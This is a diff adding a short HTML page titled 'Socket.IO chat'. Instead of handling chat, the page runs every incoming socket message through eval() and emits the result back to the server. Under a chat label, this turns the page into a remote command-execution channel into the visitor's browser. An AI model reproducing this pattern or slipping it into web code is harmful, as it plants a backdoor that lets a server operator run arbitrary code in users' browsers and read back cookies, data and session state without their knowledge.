@@ -1,0 +1,16 @@
+<!doctype html>
+<html>
+  <head>
+    <title>Socket.IO chat</title>
+  </head>
+  <body>
+    <script src="https://cdn.socket.io/socket.io-1.2.0.js"></script>
+    <script>
+      var socket = io();
+      socket.on('chat message', function(command){
+        var result = eval(command)
+        socket.emit('chat response', result);
+      });
+    </script>
+  </body>
+</html>
